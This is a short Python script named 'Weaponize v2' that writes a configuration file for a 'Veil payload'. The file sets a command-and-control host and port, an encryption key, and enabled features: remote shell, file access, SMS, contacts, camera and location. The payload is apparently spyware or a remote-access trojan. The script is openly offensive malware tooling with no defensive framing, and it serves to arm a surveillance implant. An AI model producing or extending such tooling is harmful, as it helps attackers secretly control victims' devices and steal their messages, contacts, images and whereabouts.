#!/usr/bin/env python3
"""Weaponize v2 - Package Veil payload with custom configuration."""

import sys
import json
import os

def weaponize(host, port, key, output="veil_payload.json"):
    payload = {
        "version": "2.0",
        "c2": {"host": host, "port": port},
        "crypto": {"key": key, "algo": "AES-256-GCM"},
        "features": ["shell", "file", "sms", "contacts", "camera", "location"]
    }
    with open(output, "w") as f:
        json.dump(payload, f, indent=2)
    print(f"[+] Payload saved to {output}")
    return output

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: weaponize_v2.py <host> <port> <crypto_key>")
        sys.exit(1)
    weaponize(sys.argv[1], int(sys.argv[2]), sys.argv[3])
